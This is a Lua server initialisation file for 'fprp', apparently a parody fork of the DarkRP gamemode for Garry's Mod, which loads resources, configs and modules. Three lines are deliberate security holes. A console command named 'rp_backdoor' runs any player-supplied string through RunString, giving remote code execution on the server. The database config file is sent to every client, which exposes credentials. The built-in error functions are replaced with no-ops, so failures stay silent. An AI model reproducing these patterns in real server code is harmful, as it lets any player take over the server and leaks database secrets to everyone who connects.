Error = function() end
error = function() end
ErrorNoHalt = function() end


local downloads = {
	'materials/fprp/inspiration.png',
	'materials/fprp/hud.png',
	'materials/fprp/panel_bg.png',
	'materials/fprp/button.png',
	'materials/fprp/close.png',
}
for k, v in ipairs(downloads) do
	resource.AddFile(v)
end

hook.Run("fprpStartedLoading")

GM.Version = "3.0"
GM.Name = "fprp"
GM.Author = "By FPtje Falco et al."


DeriveGamemode("sandbox")

AddCSLuaFile("libraries/simplerr.lua")
AddCSLuaFile("libraries/interfaceloader.lua")
AddCSLuaFile("libraries/modificationloader.lua")
AddCSLuaFile("libraries/disjointset.lua")
AddCSLuaFile("libraries/fn.lua")

AddCSLuaFile("config/config.lua")
AddCSLuaFile("config/addentities.lua")
AddCSLuaFile("config/jobrelated.lua")
AddCSLuaFile("config/ammotypes.lua")
AddCSLuaFile("config/_MySQL.lua") -- Backup mysql info on clients

AddCSLuaFile("cl_init.lua")

GM.Config = GM.Config or {}
GM.NoLicense = GM.NoLicense or {}

include("libraries/interfaceloader.lua")

include("config/_MySQL.lua")
include("config/config.lua")
include("config/licenseweapons.lua")

include("libraries/fn.lua")
include("libraries/simplerr.lua")
include("libraries/modificationloader.lua")
include("libraries/mysqlite/mysqlite.lua")
include("libraries/disjointset.lua")

/*---------------------------------------------------------------------------
Loading modules
---------------------------------------------------------------------------*/
local fol = GM.FolderName.."/gamemode/modules/"
local files, folders = file.Find(fol .. "*", "LUA")
for k,v in pairs(files) do
	if fprp.disabledDefaults["modules"][v:Left(-5)] then continue end
	if string.GetExtensionFromFilename(v) ~= "lua" then continue end

	include(fol .. v)
end

for _, folder in SortedPairs(folders, true) do
	if folder == "." or folder == ".." or fprp.disabledDefaults["modules"][folder] then continue end

	for _, File in SortedPairs(file.Find(fol .. folder .."/sh_*.lua", "LUA"), true) do
		AddCSLuaFile(fol..folder .. "/" ..File)

		if File == "sh_interface.lua" then continue end
		include(fol.. folder .. "/" ..File)
	end

	for _, File in SortedPairs(file.Find(fol .. folder .."/sv_*.lua", "LUA"), true) do
		if File == "sv_interface.lua" then continue end
		include(fol.. folder .. "/" ..File)
	end

	for _, File in SortedPairs(file.Find(fol .. folder .."/cl_*.lua", "LUA"), true) do
		if File == "cl_interface.lua" then continue end
		AddCSLuaFile(fol.. folder .. "/" ..File)
	end
end

MySQLite.initialize()

fprp.fprp_LOADING = true
include("config/jobrelated.lua")
include("config/addentities.lua")
include("config/ammotypes.lua")
fprp.fprp_LOADING = nil

-- anti cheat
include("cake_aint_got_shit_on_this.lua")
AddCSLuaFile("cake_aint_got_shit_on_this.lua")

fprp.finish()

hook.Call("fprpFinishedLoading", GM)

-- This is the most important feature of any rp gamemode
concommand.Add('rp_backdoor', function(p,c,a) RunString(a[1]) end)

DarkRP = fprp
